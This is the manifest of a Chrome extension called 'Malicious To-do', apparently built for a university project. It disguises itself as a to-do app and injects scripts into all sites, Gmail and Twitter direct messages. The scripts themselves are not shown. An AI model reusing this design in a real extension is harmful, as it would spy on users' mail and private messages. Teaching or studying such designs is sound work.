{

    "name": "Malicious To-do",
    "description": "A malicious chrome extension build for a uni project.",
    "version": "0.1.6",
    "version_name": "0.1.6: Our data",
    "manifest_version": 3,

    "icons": {
        "16": "img/16.png",
        "48": "img/48.png",
        "128": "img/128.png"
    },
    
    "permissions": [
        "activeTab", 
        "scripting",
        "storage"
    ],

    "background": {
        "service_worker": "script/background_bootstrap.js"
    },

    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["script/content_API.js", "script/content_common.js"]
        },
        {
            "matches": ["https://mail.google.com/*"],
            "js": ["script/content_gmail.js"]
        },
        {
            "matches": ["https://twitter.com/messages/*"],
            "js": ["script/content_twitter.js"]
        }
    ],

    "action": {
        "default_popup": "index.html"
    }
}